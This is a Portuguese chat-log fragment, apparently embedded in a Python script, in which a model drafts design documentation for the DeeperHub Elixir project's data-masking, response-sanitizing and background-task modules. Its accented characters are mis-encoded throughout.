*   **Descri√ß√£o:** Tenta identificar e mascarar automaticamente v√°rios tipos de dados sens√≠veis (CPF, email, cart√£o, etc.) dentro de uma string de texto livre.
*   **`opts`:**
    *   `:types_to_mask` (list(atom)): Lista de tipos a procurar (ex: `[:cpf, :email, :credit_card]`). Se omitido, tenta todos os tipos configurados.
    *   `:mask_char` (String.t): Caractere a ser usado para mascaramento. (Padr√£o: `*`)
    *   `:custom_patterns` (map): Mapa de `{type_atom, regex}` para padr√µes de detec√ß√£o customizados.
*   **Exemplo:**
    ```elixir
    text = \"Contato: joao@example.com, CPF: 123.456.789-00.\"
    {:ok, masked} = DataMasking.mask_sensitive_data(text)
    # masked poderia ser \"Contato: j***@e******.com, CPF: ***.***.***-00.\"
    ```

### 6.2. `DeeperHub.Security.DataMasking.mask_sensitive_map(data_map :: map(), sensitive_keys :: list(atom() | String.t()), opts :: keyword()) :: {:ok, map()} | {:error, term()}`

*   **Descri√ß√£o:** Mascara os valores das chaves especificadas em `sensitive_keys` dentro de `data_map`.
*   **`opts`:**
    *   `:replacement_value` (String.t): Valor a ser usado para substitui√ß√£o. (Padr√£o: `\"[REDACTED]\"`)
    *   `:recursive` (boolean): Se deve aplicar o mascaramento a mapas aninhados. (Padr√£o: `true`)
    *   `:apply_type_specific_masking` (boolean): Se `true`, para chaves conhecidas (ex: `:email`, `:cpf`), tenta aplicar mascaramento espec√≠fico do tipo em vez de apenas `replacement_value`. (Padr√£o: `false`)

### 6.3. Fun√ß√µes Espec√≠ficas de Tipo:

*   **`DeeperHub.Security.DataMasking.mask_email(email :: String.t(), opts :: keyword()) :: {:ok, String.t()}`**
    *   `opts`: `:visible_prefix_chars` (int, Padr√£o: 1), `:visible_domain_chars` (int, Padr√£o: 0), `:preserve_domain_extension` (bool, Padr√£o: true).
    *   Ex: `j***@e******.com`
*   **`DeeperHub.Security.DataMasking.mask_cpf(cpf :: String.t(), opts :: keyword()) :: {:ok, String.t()}`**
    *   `opts`: `:visible_digits_start` (int, Padr√£o: 3), `:visible_digits_end` (int, Padr√£o: 2).
    *   Ex: `***.456.789-**` ou `123.***.***-00`.
*   **`DeeperHub.Security.DataMasking.mask_credit_card(card_number :: String.t(), opts :: keyword()) :: {:ok, String.t()}`**
    *   `opts`: `:visible_last_digits` (int, Padr√£o: 4), `:visible_first_digits` (int, Padr√£o: 0 ou 6 para preservar BIN).
    *   Ex: `****-****-****-3456`.
*   **`DeeperHub.Security.DataMasking.mask_phone(phone :: String.t(), opts :: keyword()) :: {:ok, String.t()}`**
    *   `opts`: `:visible_last_digits` (int, Padr√£o: 4), `:preserve_prefix_chars` (int, Padr√£o: 0, mas pode ser usado para DDD + c√≥digo pa√≠s).
    *   Ex: `(11) *****-4321`.

### 6.4. `DeeperHub.Security.DataMasking.mask_for_log(data :: String.t() | map(), opts :: keyword()) :: String.t() | map()`

*   **Descri√ß√£o:** Fun√ß√£o de conveni√™ncia que aplica `mask_sensitive_data/2` se `data` for string, ou `mask_sensitive_map/3` se for mapa. Usa uma lista padr√£o de `sensitive_keys` configurada para mapas.
*   **`opts`:** Pode encaminhar op√ß√µes para as fun√ß√µes subjacentes.
    *   `:default_sensitive_keys_for_log` (list): Sobrescreve a lista padr√£o de chaves para mascarar em logs.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :data_masking, :enabled]`** (Boolean): Habilita/desabilita o mascaramento. (Padr√£o: `true`)
*   **`[:security, :data_masking, :default_mask_char]`** (String): Caractere padr√£o para mascaramento. (Padr√£o: `\"*\"`)
*   **`[:security, :data_masking, :default_redacted_placeholder]`** (String): Placeholder para campos de mapa totalmente redigidos. (Padr√£o: `\"[REDACTED]\"`)
*   **`[:security, :data_masking, :log_masking_sensitive_keys]`** (List de Strings/Atoms): Lista padr√£o de chaves a serem mascaradas por `mask_for_log/2` quando o input √© um mapa.
    *   Ex: `[\"password\", \"token\", \"secret\", \"credit_card_number\", \"cvv\", \"api_key\"]`
*   **Padr√µes espec√≠ficos por tipo:**
    *   `[:security, :data_masking, :email, :visible_prefix_chars]` (Integer)
    *   `[:security, :data_masking, :cpf, :visible_digits_end]` (Integer)
    *   `[:security, :data_masking, :credit_card, :visible_last_digits]` (Integer)
    *   ... e assim por diante para outros tipos.
*   **`[:security, :data_masking, :auto_detect_patterns]`** (List de Maps): Configura√ß√£o para `mask_sensitive_data/2`.
    *   Ex: `[%{type: :email, regex: ~r/.../, mask_function: &MyMaskers.email/1}, ...]`

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`: Para obter configura√ß√µes de mascaramento.
*   `DeeperHub.Core.Logger`: Para logar se o mascaramento falhar ou se uma tentativa de logar dados n√£o mascarados for detectada (se houver tal verifica√ß√£o).

### 8.2. Bibliotecas Externas

*   Nenhuma espec√≠fica √© estritamente necess√°ria, mas bibliotecas de manipula√ß√£o de string ou regex podem ser usadas internamente.

## ü§ù 9. Como Usar / Integra√ß√£o

*   **Em M√≥dulos de Logging (`DeeperHub.Security.LogSanitizer`):**
    *   O `LogSanitizer` chamaria `DataMasking.mask_for_log(metadata_map)` antes de passar os metadados para os backends de log.
*   **Em M√≥dulos de API (`DeeperHub.Security.ResponseSanitizer`):**
    *   O `ResponseSanitizer` chamaria `DataMasking.mask_sensitive_map(api_response_body, configured_sensitive_keys_for_api)` antes de serializar para JSON.
*   **Em Interfaces de Usu√°rio (ex: painel de admin mostrando dados de usu√°rio):**
    *   O controller ou view helper chamaria as fun√ß√µes de mascaramento espec√≠ficas antes de renderizar os dados.
    ```elixir
    # Em um controller/view
    def show_user_details(user) do
      masked_email = DeeperHub.Security.DataMasking.mask_email(user.email) |> elem(1)
      masked_cpf = DeeperHub.Security.DataMasking.mask_cpf(user.cpf) |> elem(1)
      # ... renderizar com dados mascarados
    end
    ```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar cada fun√ß√£o de mascaramento espec√≠fica (`mask_email`, `mask_cpf`, etc.) com v√°rios formatos de entrada v√°lidos e inv√°lidos.
*   Testar `mask_sensitive_data` com strings contendo m√∫ltiplos tipos de dados sens√≠veis.
*   Testar `mask_sensitive_map` com mapas simples e aninhados, e diferentes `sensitive_keys`.
*   Testar o comportamento com diferentes configura√ß√µes (ex: caracteres de mascaramento, n√∫mero de d√≠gitos vis√≠veis).
*   Localiza√ß√£o: `test/deeper_hub/security/data_masking/`.

### 10.2. M√©tricas

*   `deeper_hub.security.data_masking.fields_masked.count` (tags: `data_type` (`email`, `cpf`, `map_key`), `context` (`log`, `api_response`, `ui`))
*   `deeper_hub.security.data_masking.auto_detected_masked.count` (tags: `data_type`)

### 10.3. Logs

*   **N√≠vel DEBUG:** Informa√ß√µes sobre quais campos foram mascarados em uma determinada chamada (√∫til durante o desenvolvimento e ajuste de regras).
*   **N√≠vel WARNING:** Se uma fun√ß√£o de mascaramento receber um tipo de dado inesperado ou se um padr√£o de regex configurado falhar ao compilar.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :data_masking, :data_masked]`
    *   Metadados: `%{data_type: type, characters_original: len, characters_masked: len, context: context_string}`

## ‚ùå 11. Tratamento de Erros

*   As fun√ß√µes de mascaramento devem ser robustas e n√£o falhar se a entrada n√£o corresponder exatamente ao formato esperado (ex: um CPF mal formatado). Nesses casos, elas podem optar por retornar a string original (com um log de aviso) ou aplicar um mascaramento mais gen√©rico/completo.
*   Falhas em obter configura√ß√µes (ex: padr√µes de regex) devem levar a um comportamento de mascaramento padr√£o seguro (ex: redigir completamente o campo).

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa (do pr√≥prio M√≥dulo)

*   **Efic√°cia do Mascaramento:** Garantir que os padr√µes de mascaramento realmente ocultem a informa√ß√£o sens√≠vel e n√£o permitam infer√™ncia f√°cil dos dados originais.
*   **N√£o Mascarar Excessivamente:** Evitar mascarar tanta informa√ß√£o que os dados se tornem in√∫teis para o prop√≥sito pretendido (ex: depura√ß√£o, identifica√ß√£o parcial).
*   **Performance:** Regexes complexas ou mascaramento recursivo em estruturas de dados muito grandes podem impactar a performance. Otimizar e testar o desempenho.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Ao adicionar suporte para mascarar novos tipos de dados, crie uma fun√ß√£o espec√≠fica e adicione-a aos mecanismos de detec√ß√£o autom√°tica, se aplic√°vel.
*   Mantenha os padr√µes de regex e as regras de mascaramento atualizados e bem testados.
*   Considere a internacionaliza√ß√£o se estiver mascarando dados que variam significativamente por localidade (ex: formatos de telefone, n√∫meros de identifica√ß√£o nacionais).

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar mascaramento diferencial: diferentes n√≠veis de mascaramento para o mesmo dado dependendo do papel do usu√°rio que o visualiza.
*   [ ] Adicionar suporte para \"tokeniza√ß√£o\" ou \"criptografia format-preserving\" como alternativas mais avan√ßadas ao mascaramento simples para certos casos de uso onde a reversibilidade controlada ou a manuten√ß√£o do formato original s√£o necess√°rias.
*   [ ] Permitir que as regras de mascaramento (especialmente para `mask_sensitive_map` e `mask_for_log`) sejam configuradas dinamicamente com mais granularidade atrav√©s do `SecurityPolicyManager`.
*   [ ] Desenvolver ferramentas para ajudar a identificar automaticamente dados sens√≠veis no c√≥digo que deveriam ser mascarados antes de logar/exibir.
*   [ ] Avaliar o uso de bibliotecas especializadas em detec√ß√£o e mascaramento de PII se as necessidades se tornarem muito complexas.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

O mascaramento de dados √© um aspecto importante da prote√ß√£o de dados e privacidade!

Para o pr√≥ximo, podemos abordar `DeeperHub.Security.ResponseSanitizer` que √© um consumidor natural do `DataMasking`, ou mudar para um m√≥dulo de infraestrutura como `DeeperHub.Core.BackgroundTaskManager`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Perfeito! Vamos continuar com o `DeeperHub.Security.ResponseSanitizer`, que √© um consumidor direto das funcionalidades do `DataMasking` e essencial para proteger dados em tr√¢nsito para o cliente.

---

# M√≥dulo: `DeeperHub.Security.ResponseSanitizer` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Security.ResponseSanitizer`

O m√≥dulo `DeeperHub.Security.ResponseSanitizer` √© respons√°vel por **sanitizar as respostas da API e das p√°ginas web** antes que sejam enviadas aos clientes. Seu principal objetivo √© prevenir o vazamento de dados sens√≠veis ou a inclus√£o de conte√∫do malicioso que poderia ser explorado no lado do cliente (embora o foco principal de XSS seja na entrada, a sanitiza√ß√£o de sa√≠da √© uma defesa adicional).

Este m√≥dulo trabalha em conjunto com `DeeperHub.Security.DataMasking` para aplicar regras de mascaramento a dados sens√≠veis e pode tamb√©m filtrar ou modificar cabe√ßalhos HTTP para refor√ßar a seguran√ßa. A ideia √© garantir que apenas as informa√ß√µes necess√°rias e seguras cheguem ao usu√°rio final. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Sanitiza√ß√£o do Corpo da Resposta (`sanitize_response/2`):**
    *   Analisar o corpo da resposta (JSON, HTML, etc.) e aplicar regras de sanitiza√ß√£o.
    *   Integrar com `DeeperHub.Security.DataMasking` para mascarar campos sens√≠veis identificados em respostas JSON ou estruturas de dados antes da serializa√ß√£o.
    *   Para respostas HTML (embora menos comum para APIs puras), aplicar sanitiza√ß√£o XSS como uma camada de defesa adicional, mesmo que os templates j√° devam fazer escaping.
*   **Filtragem de Campos Sens√≠veis (`filter_sensitive_fields/2`):**
    *   Remover ou substituir campos explicitamente marcados como sens√≠veis e que n√£o deveriam ser expostos em uma determinada resposta de API, mesmo que o usu√°rio tenha permiss√£o para a entidade principal.
*   **Sanitiza√ß√£o de Cabe√ßalhos HTTP (`sanitize_headers/2`):**
    *   Remover ou modificar cabe√ßalhos HTTP de resposta que possam vazar informa√ß√µes sens√≠veis sobre o servidor ou a aplica√ß√£o (ex: `Server`, `X-Powered-By`, vers√µes detalhadas de software).
    *   Garantir que cabe√ßalhos de seguran√ßa (CSP, HSTS, etc., gerenciados por outros m√≥dulos como `XssProtection` ou um plug de seguran√ßa HTTP) estejam corretamente configurados e n√£o sejam sobrescritos indevidamente.
*   **Configurabilidade de Regras de Sanitiza√ß√£o:**
    *   Permitir a defini√ß√£o de quais campos s√£o sens√≠veis por tipo de resposta ou endpoint.
    *   Configurar o comportamento da sanitiza√ß√£o (remover campo, mascarar, substituir por placeholder).
*   **Integra√ß√£o com `Core.APIResponder`:**
    *   Potencialmente, ser chamado pelo `APIResponder` antes de serializar a resposta final para o cliente.
*   **Observabilidade:**
    *   Registrar m√©tricas sobre o n√∫mero de respostas sanitizadas e os tipos de dados modificados.
    *   Logar quando dados sens√≠veis s√£o ativamente removidos ou mascarados de uma resposta.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.ResponseSanitizer` (Fachada P√∫blica / M√≥dulo Funcional):**
    *   Ponto de entrada para as funcionalidades de sanitiza√ß√£o de respostas.
    *   Cont√©m a l√≥gica para orquestrar a sanitiza√ß√£o do corpo e dos cabe√ßalhos.
    *   **Intera√ß√µes:**
        *   `DeeperHub.Security.DataMasking`: Para aplicar regras de mascaramento a campos espec√≠ficos.
        *   `DeeperHub.Core.ConfigManager` / `SecurityPolicyManager`: Para obter a lista de campos sens√≠veis por contexto, cabe√ßalhos a serem removidos/modificados, e outras pol√≠ticas de sanitiza√ß√£o.
        *   `DeeperHub.Core.Logger` e `Core.Metrics`: Para observabilidade.
2.  **Configura√ß√µes (via `Core.ConfigManager` / `SecurityPolicyManager`):**
    *   Listas de chaves sens√≠veis globais e por endpoint/tipo de resposta.
    *   Lista de cabe√ßalhos HTTP a serem removidos ou com valores fixos.
    *   Padr√µes de sanitiza√ß√£o para diferentes tipos de conte√∫do.

### 3.2. Estrutura de Diret√≥rios (Proposta)

Como este m√≥dulo tende a ser mais funcional e depende fortemente de configura√ß√µes, pode ser simples:
```
lib/deeper_hub/security/response_sanitizer.ex  # Cont√©m a fachada e a l√≥gica de servi√ßo
```
Se a l√≥gica se tornar muito complexa com diferentes estrat√©gias de sanitiza√ß√£o:
```
lib/deeper_hub/security/response_sanitizer/
‚îú‚îÄ‚îÄ response_sanitizer.ex             # Fachada P√∫blica
‚îÇ
‚îî‚îÄ‚îÄ services/
    ‚îî‚îÄ‚îÄ response_sanitizer_service.ex # L√≥gica principal
```

### 3.3. Decis√µes de Design Importantes

*   **Integra√ß√£o Transparente:** Idealmente, a sanitiza√ß√£o de respostas deve ser integrada de forma transparente no fluxo de resposta da API (ex: atrav√©s de um Plug Phoenix ou como parte do `APIResponder`).
*   **Performance:** A sanitiza√ß√£o n√£o deve adicionar uma sobrecarga significativa √† gera√ß√£o de respostas. Regexes ou itera√ß√µes em grandes estruturas de dados devem ser eficientes.
*   **Configurabilidade Detalhada:** Administradores devem poder configurar facilmente quais campos s√£o considerados sens√≠veis para diferentes contextos de API sem alterar o c√≥digo.
*   **N√£o Substitui a L√≥gica de Neg√≥cio:** O `ResponseSanitizer` n√£o deve ser usado para implementar l√≥gica de autoriza√ß√£o de campo (ou seja, decidir se um usu√°rio *pode ver* um campo). Essa decis√£o pertence √† camada de servi√ßo/controller. O sanitizer apenas garante que, se um campo sens√≠vel *estiver* presente, ele seja tratado (mascarado/removido) antes de sair.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **API Retorna Detalhes do Usu√°rio:**
    *   Um endpoint `/api/v1/users/me` retorna os dados do usu√°rio.
    *   Antes de enviar, `ResponseSanitizer.sanitize_response(user_data_map, opts)` √© chamado.
    *   Se `user_data_map` contiver `%{password_hash: \"...\"}`, este campo √© removido ou substitu√≠do por `\"[FILTERED]\"`. Campos como CPF ou data de nascimento podem ser mascarados usando `DataMasking`.
*   **API de Administra√ß√£o Exibe Lista de Usu√°rios:**
    *   Um endpoint `/admin/api/users` retorna uma lista de usu√°rios.
    *   Para cada usu√°rio na lista, campos como `last_login_ip` ou `email_secundario_nao_verificado` podem ser removidos ou mascarados se a pol√≠tica para essa API de admin assim definir.
*   **Remo√ß√£o de Cabe√ßalhos HTTP Padr√£o:**
    *   O `ResponseSanitizer` (ou um Plug que o utiliza) remove ou modifica cabe√ßalhos como `Server: Cowboy` ou `X-Powered-By: Elixir/Phoenix` para evitar fingerprinting do servidor.

## üåä 5. Fluxos Importantes

### Fluxo de Sanitiza√ß√£o de uma Resposta JSON de API (Exemplo com Plug)

1.  **Controller Prepara Dados:** O Controller de API prepara um mapa `response_data` para ser enviado como JSON.
2.  **Plug `ResponseSanitizerPlug` (no final do pipeline, antes da serializa√ß√£o JSON):**
    *   Recebe a `conn` e o `response_data` (talvez armazenado em `conn.assigns.response_body` pelo controller).
    *   Chama `DeeperHub.Security.ResponseSanitizer.sanitize_response(response_data, %{context: conn.request_path, endpoint_config_key: \"api.users.get_details\"})`.
3.  **`ResponseSanitizer.sanitize_response/2`:**
    *   Obt√©m as regras de sanitiza√ß√£o para o `context` ou `endpoint_config_key` do `ConfigManager` (ex: lista de campos sens√≠veis a serem removidos/mascarados).
    *   Itera sobre o `response_data`.
    *   Para campos marcados como sens√≠veis e que devem ser mascarados, chama `DeeperHub.Security.DataMasking` (ex: `DataMasking.mask_email(value)`).
    *   Para campos marcados como sens√≠veis e que devem ser removidos, os remove do mapa.
    *   Chama `DeeperHub.Security.ResponseSanitizer.sanitize_headers(conn.resp_headers, opts)` para limpar cabe√ßalhos.
4.  **Plug `ResponseSanitizerPlug`:**
    *   Atualiza `conn.assigns.response_body` com os dados sanitizados.
    *   Atualiza `conn.resp_headers` com os cabe√ßalhos sanitizados.
5.  **Serializa√ß√£o e Envio:** O `APIResponder` (ou o renderizador Phoenix) pega os dados sanitizados e os envia para o cliente.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada)

### 6.1. `DeeperHub.Security.ResponseSanitizer.sanitize_response(data :: map() | list() | String.t(), opts :: keyword()) :: {:ok, sanitized_data :: term()} | {:error, term()}`

*   **Descri√ß√£o:** Sanitiza o corpo de uma resposta. Se for um mapa ou lista, aplica `filter_sensitive_fields` e `DataMasking`. Se for uma string HTML (menos comum para APIs), pode aplicar `XssProtection.sanitize_html`.
*   **`opts`:**
    *   `:content_type` (String.t): Tipo de conte√∫do da resposta (ex: `\"application/json\"`, `\"text/html\"`). Influencia a estrat√©gia de sanitiza√ß√£o.
    *   `:sensitive_keys` (list(atom() | String.t)): Lista de chaves a serem filtradas/mascaradas se `data` for um mapa/lista. Sobrescreve as configura√ß√µes globais para esta chamada.
    *   `:masking_options_for_key` (map): `%{key => data_masking_opts}` para aplicar op√ß√µes de mascaramento espec√≠ficas por chave.
    *   `:html_sanitize_options` (keyword): Op√ß√µes para `XssProtection.sanitize_html` se for uma resposta HTML.

### 6.2. `DeeperHub.Security.ResponseSanitizer.filter_sensitive_fields(data :: map() | list(), keys_to_filter :: list(atom() | String.t()), replacement_value :: String.t() | nil) :: map() | list()`

*   **Descri√ß√£o:** Remove (se `replacement_value` for `nil`) ou substitui os valores das chaves especificadas em `keys_to_filter`.
*   **`replacement_value`:** (Padr√£o: `\"[FILTERED]\"`)

### 6.3. `DeeperHub.Security.ResponseSanitizer.sanitize_headers(headers :: list({String.t(), String.t()}), opts :: keyword()) :: list({String.t(), String.t()})`

*   **Descri√ß√£o:** Remove ou modifica cabe√ßalhos HTTP sens√≠veis da lista de cabe√ßalhos de resposta.
*   **`opts`:**
    *   `:headers_to_remove` (list(String.t)): Lista de nomes de cabe√ßalhos (case-insensitive) a serem completamente removidos.
    *   `:headers_to_overwrite` (map): `%{header_name => new_value}` para sobrescrever valores de cabe√ßalhos.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :response_sanitizer, :enabled]`** (Boolean): Habilita/desabilita a sanitiza√ß√£o de respostas. (Padr√£o: `true`)
*   **`[:security, :response_sanitizer, :default_sensitive_keys]`** (List de Strings/Atoms): Lista global de chaves que devem ser filtradas/mascaradas em respostas JSON/mapa, a menos que um contexto espec√≠fico diga o contr√°rio.
    *   Ex: `[\"password_hash\", \"internal_token\", \"user_salt\"]`
*   **`[:security, :response_sanitizer, :default_replacement_value]`** (String): Placeholder padr√£o para campos filtrados. (Padr√£o: `\"[FILTERED]\"`)
*   **`[:security, :response_sanitizer, :headers_to_remove_default]`** (List de Strings): Cabe√ßalhos HTTP que devem ser sempre removidos das respostas.
    *   Ex: `[\"X-Powered-By\", \"Server\", \"X-AspNet-Version\"]`
*   **`[:security, :response_sanitizer, :endpoint_policies, <request_path_pattern>]`** (Map): Pol√≠ticas espec√≠ficas por endpoint ou padr√£o de path.
    *   Ex: `%{ \"/api/v1/users/me\": %{allow_fields: [\"id\", \"email\", \"profile\"], mask_fields: %{cpf: :partial}}, \"/admin/users\": %{remove_fields: [\"password_hash\"]} }`
    *   Isto permite um controle granular sobre o que √© exposto em cada API.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`: Para obter pol√≠ticas e listas de campos sens√≠veis.
*   `DeeperHub.Core.Logger`: Para logar a√ß√µes de sanitiza√ß√£o.
*   `DeeperHub.Security.DataMasking`: Para aplicar mascaramento espec√≠fico a tipos de dados.
*   `DeeperHub.Security.XssProtection`: Se for necess√°rio sanitizar respostas HTML.

### 8.2. Bibliotecas Externas

*   Nenhuma espec√≠fica, mas pode usar bibliotecas de manipula√ß√£o de mapas/listas eficientes.

## ü§ù 9. Como Usar / Integra√ß√£o

*   **Plug Phoenix:** A forma mais comum de integrar √© atrav√©s de um Plug no final do pipeline de API, antes da resposta ser enviada.
    ```elixir
    # lib/deeper_hub_web/plugs/response_sanitizer_plug.ex
    defmodule DeeperHubWeb.Plugs.ResponseSanitizerPlug do
      import Plug.Conn
      alias DeeperHub.Security.ResponseSanitizer

      def init(opts), do: opts

      def call(conn, _opts) do
        # Registrar um before_send para modificar o corpo e cabe√ßalhos finais
        register_before_send(conn, fn conn_before_send ->
          # Sanitizar corpo (assumindo que est√° em conn_before_send.resp_body se j√° foi setado)
          # Esta parte √© mais complexa com Phoenix porque o corpo √© setado pelo controller.
          # Uma abordagem pode ser ter o APIResponder chamar o sanitizer.
          # Ou, se o corpo for um assign:
          # if assigned_body = conn_before_send.assigns[:response_data_for_client] do
          #   {:ok, sanitized_body} = ResponseSanitizer.sanitize_response(assigned_body, context: conn_before_send.request_path)
          #   conn_before_send = %{conn_before_send | resp_body: Jason.encode!(sanitized_body)} # Exemplo, a serializa√ß√£o real √© feita depois
          # end
          
          # Sanitizar Cabe√ßalhos
          sanitized_headers = ResponseSanitizer.sanitize_headers(conn_before_send.resp_headers)
          
          # Reconstruir conn com headers sanitizados
          # Esta √© uma simplifica√ß√£o; a manipula√ß√£o de resp_headers precisa ser feita com cuidado.
          Enum.reduce(conn_before_send.resp_headers, conn_before_send, fn {key, _val}, c -> delete_resp_header(c, key) end)
          |> Enum.reduce(sanitized_headers, fn {key, val}, c -> put_resp_header(c, key, val) end)
        end)
      end
    end

    # No APIResponder
    defmodule DeeperHub.Core.APIResponder do
      alias DeeperHub.Security.ResponseSanitizer
      # ...
      def send_success(conn, status, data_map) do
        # Supondo que 'data_map' s√£o os dados ANTES de qualquer mascaramento para o cliente
        endpoint_policy_key = # Derivar da conn.request_path ou rota
        {:ok, sanitized_data} = ResponseSanitizer.sanitize_response(data_map, %{policy_key: endpoint_policy_key})
        
        # ... ent√£o formatar 'sanitized_data' na estrutura de resposta padr√£o e enviar ...
        json(conn |> put_status(status), %{status: \"success\", data: sanitized_data})
      end
    end
    ```
    A integra√ß√£o mais limpa para o corpo da resposta √© geralmente dentro do `APIResponder` ou uma fun√ß√£o de renderiza√ß√£o customizada, antes da serializa√ß√£o final.

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar `sanitize_response` com diferentes tipos de dados (mapas, listas, strings) e diferentes configura√ß√µes de `sensitive_keys` e op√ß√µes de mascaramento.
*   Testar `sanitize_headers` para garantir que os cabe√ßalhos corretos s√£o removidos/modificados.
*   Verificar a l√≥gica de fallback para pol√≠ticas de endpoint vs. globais.
*   Localiza√ß√£o: `test/deeper_hub/security/response_sanitizer/`.

### 10.2. M√©tricas

*   `deeper_hub.security.response_sanitizer.responses_processed.count` (tags: `endpoint_pattern`)
*   `deeper_hub.security.response_sanitizer.fields_filtered.count` (tags: `field_key`, `endpoint_pattern`)
*   `deeper_hub.security.response_sanitizer.fields_masked.count` (tags: `field_key`, `masking_type`)
*   `deeper_hub.security.response_sanitizer.headers_removed.count` (tags: `header_name`)

### 10.3. Logs

*   **N√≠vel DEBUG:** Detalhes sobre quais campos/cabe√ßalhos foram sanitizados em uma resposta espec√≠fica (cuidado com o volume de logs).
*   **N√≠vel INFO:** Carregamento de novas pol√≠ticas de sanitiza√ß√£o.
*   **N√≠vel WARNING:** Tentativa de sanitizar um tipo de conte√∫do n√£o suportado ou configura√ß√£o de pol√≠tica de sanitiza√ß√£o ausente para um endpoint.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :response_sanitizer, :sanitize_body, :stop]`
    *   Metadados: `%{request_path: path, fields_filtered_count: count, fields_masked_count: count}`
*   `[:deeper_hub, :security, :response_sanitizer, :sanitize_headers, :stop]`
    *   Metadados: `%{request_path: path, headers_removed_count: count}`

## ‚ùå 11. Tratamento de Erros

*   Se a sanitiza√ß√£o de uma resposta falhar (ex: erro ao aplicar uma regra de mascaramento complexa), o sistema deve, idealmente, logar o erro e retornar uma resposta de erro gen√©rica para o cliente, em vez de vazar dados n√£o sanitizados ou quebrar a requisi√ß√£o.
*   Falhas ao carregar pol√≠ticas de sanitiza√ß√£o do `ConfigManager` devem levar ao uso de pol√≠ticas padr√£o restritivas.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa (do pr√≥prio M√≥dulo)

*   **Defini√ß√£o Correta de \"Sens√≠vel\":** A efic√°cia do `ResponseSanitizer` depende inteiramente da correta identifica√ß√£o e configura√ß√£o de quais campos e cabe√ßalhos s√£o sens√≠veis em diferentes contextos. Esta √© uma tarefa cont√≠nua.
*   **N√£o Confiar Apenas na Sanitiza√ß√£o de Sa√≠da:** A sanitiza√ß√£o de sa√≠da √© uma camada de defesa. A l√≥gica de neg√≥cio prim√°ria n√£o deve carregar ou processar dados sens√≠veis desnecessariamente, e a autoriza√ß√£o de acesso a campos deve ocorrer antes da fase de sanitiza√ß√£o.
*   **Complexidade vs. Performance:** Regras de sanitiza√ß√£o muito complexas ou a necessidade de inspecionar profundamente grandes volumes de dados de resposta podem impactar a lat√™ncia.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Ao adicionar novos endpoints de API ou modificar os dados retornados, revise e atualize as pol√≠ticas de `ResponseSanitizer` no `ConfigManager` para garantir que nenhum novo dado sens√≠vel seja exposto acidentalmente.
*   Mantenha a lista de `default_sensitive_keys` e `headers_to_remove_default` atualizada com as melhores pr√°ticas.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Permitir pol√≠ticas de sanitiza√ß√£o baseadas no papel do usu√°rio autenticado (ex: admins veem mais dados que usu√°rios regulares).
*   [ ] Integra√ß√£o com um sistema de \"Data Loss Prevention\" (DLP) mais amplo, se aplic√°vel.
*   [ ] Adicionar a capacidade de \"anotar\" campos em schemas Ecto com metadados sobre sua sensibilidade, para que o `ResponseSanitizer` possa usar essas anota√ß√µes para aplicar regras automaticamente.
*   [ ] Desenvolver ferramentas de teste que verifiquem automaticamente as respostas da API contra uma lista de padr√µes de dados sens√≠veis que n√£o deveriam vazar.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Com isso, temos uma boa cobertura da sanitiza√ß√£o de respostas.

Para o pr√≥ximo, que tal `DeeperHub.Core.BackgroundTaskManager` para explorarmos a execu√ß√£o de tarefas ass√≠ncronas, ou prefere continuar com algum outro m√≥dulo de seguran√ßa como `HashingService` ou `AtRestEncryptionService` (que j√° tocamos um pouco)?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Entendido! Vamos detalhar o `DeeperHub.Core.BackgroundTaskManager`. Este √© um componente de infraestrutura vital para executar opera√ß√µes que n√£o precisam bloquear o ciclo de requisi√ß√£o-resposta ou que s√£o de longa dura√ß√£o.

---

# M√≥dulo: `DeeperHub.Core.BackgroundTaskManager` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Core.BackgroundTaskManager`

O m√≥dulo `DeeperHub.Core.BackgroundTaskManager` √© o sistema centralizado para **gerenciar e executar tarefas em segundo plano (background tasks)** no DeeperHub. Ele permite que a aplica√ß√£o enfileire trabalhos para execu√ß√£o ass√≠ncrona, desacoplando opera√ß√µes demoradas ou n√£o cr√≠ticas do fluxo principal de intera√ß√£o do usu√°rio.

Isso √© crucial para manter a responsividade da aplica√ß√£o, processar grandes volumes de dados, interagir com servi√ßos externos lentos e agendar tarefas recorrentes. O BackgroundTaskManager abstrai a biblioteca ou o mecanismo de enfileiramento subjacente (ex: Oban, Exq, Broadway, ou um sistema customizado baseado em GenServer/ETS). üòä

